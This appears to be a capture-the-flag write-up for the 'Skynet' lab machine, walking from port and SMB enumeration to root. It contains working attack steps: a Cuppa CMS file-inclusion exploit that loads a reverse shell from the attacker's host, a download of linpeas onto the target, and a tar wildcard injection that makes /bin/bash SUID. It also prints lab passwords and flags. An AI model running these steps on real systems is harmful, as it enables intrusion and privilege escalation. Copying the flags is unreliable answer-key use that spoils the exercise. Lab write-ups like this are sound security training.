# Skynet

~~~
# 1 What is Miles password for his emails? cyborg007haloterminator
# 2 What is the hidden directory? /45kra24zxs28v3yd
# 3 What is the vulnerability called when you can include a remote file for malicious purposes? Remote file inclusion
# 4 What is the user flag? 7ce5c2109a40f958099283600a9ae807
# 5 What is the root flag? 3f0372db24753accc7179a282cd6a949
~~~

# Website

~~~
gobuster discovers this
http://10.10.71.141/squirrelmail/src/login.php

username: milesdyson
password: cyborg007haloterminator

mail 

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

/45kra24zxs28v3yd

Gobuster this reveals 
/administrator

─$ searchsploit Cuppa CMS 
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   | php/webapps/25971.txt

sudo searchsploit -m php/webapps/25971.txt  

http://10.10.71.141/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 
~~~

# Reconnaissance

# Nmap

~~~
└─$ sudo nmap -sC -sV -oN nmap/initial 10.10.71.141 -Pn

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 19:30 BST
Nmap scan report for 10.10.71.141
Host is up (0.026s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES PIPELINING AUTH-RESP-CODE UIDL SASL TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK ID LITERAL+ capabilities SASL-IR post-login Pre-login more IDLE IMAP4rev1 listed ENABLE have LOGINDISABLEDA0001 LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m11s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-25T18:31:02
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-09-25T13:31:01-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
zsh: segmentation fault  sudo nmap -sC -sV -oN nmap/initial 10.10.71.141 -Pn

~~~

# Gobuster

~~~
└─$ gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py -z
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,cgi,html,js,css,py,php,sh
[+] Timeout:                 10s
===============================================================
2022/09/25 19:31:41 Starting gobuster in directory enumeration mode
===============================================================
Error: error on running gobuster: unable to connect to http://: Get "http:": http: no Host in request URL
                                                        
┌──(sloppy㉿kali)-[~/Downloads/Skynet]
└─$ export IP=10.10.71.141
                                                        
┌──(sloppy㉿kali)-[~/Downloads/Skynet]
└─$ gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py -z
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.71.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,sh,txt,cgi,html,js,css,py
[+] Timeout:                 10s
===============================================================
2022/09/25 19:31:57 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 523]
/admin                (Status: 301) [Size: 312] [--> http://10.10.71.141/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.71.141/css/]  
/style.css            (Status: 200) [Size: 2667]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.71.141/js/]   
/config               (Status: 301) [Size: 313] [--> http://10.10.71.141/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.71.141/ai/]        
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.71.141/squirrelmail/]
/server-status        (Status: 403) [Size: 277] 
/.htaccess 
/.hta 
/.htpasswd    

~~~

# Nkito

~~~
└─$ nikto -h http://$IP | tee nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.71.141
+ Target Hostname:    10.10.71.141
+ Target Port:        80
+ Start Time:         2022-09-25 19:30:52 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 20b, size: 592bbec81c0b6, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie SQMSESSID created without the httponly flag
+ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found                                               
+ OSVDB-3233: /icons/README: Apache default file found. 
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host                                               
+ End Time:           2022-09-25 19:35:10 (GMT1) (258 seconds)                                                  
---------------------------------------------------------------------------                                     
+ 1 host(s) tested  
~~~

# Enumeration Samba

~~~
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.71.141
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 19:37 BST
Nmap scan report for 10.10.71.141
Host is up (0.023s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   SKYNET\milesdyson (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.71.141\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.71.141\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.71.141\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 5.25 seconds
zsh: segmentation fault  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.71.141

smbclient //10.10.71.141/anonymous
Password for [WORKGROUP\sloppy]: anonymous
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019

                9204224 blocks of size 1024. 5674248 blocks available
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

                9204224 blocks of size 1024. 5629552 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.7 KiloBytes/sec)
smb: \logs\> exit

smb: \> more attention.txt

A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

smbmap -H 10.10.71.141
[+] Guest session       IP: 10.10.71.141:445    Name: 10.10.71.141                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))


smbclient -U SKYNET/milesdyson '\\10.10.71.141/milesdyson'
Password for [SKYNET\milesdyson]: )s{A&2Z=F^n_E.B`

ls
cd notes
more important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
~~~

# Remote File Incursion (Reverse SHell)
~~~
create poc.php 
<?php
	system('whoami');
?>

curl http://10.10.71.141/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.91.23:8001/shell.php

Use php-reverse-shell (change IP, port)

sudo python3 -m http.server 8001

$ sudo nc -lvnp port              

curl http://10.10.71.141/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.91.23:8001/shell.php

Access granted
~~~

# Root access
~~~
$ wget "http://10.18.91.23:8001/linpeas.sh"
$ chmod +x linpeas.sh
$ ./linpeas.sh

Vulnerable to CVE-2021-4034 
Potentially Vulnerable to CVE-2022-2588

Cronjobs

*/1 *   * * *   root    /home/milesdyson/backups/backup.sh

cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

cd /var/www/html

ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash

date 

printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh 
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

ls
date

ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash

/bin/bash -p
whoami
root

cd /root
cat root.txt
3f0372db24753accc7179a282cd6a949

~~~



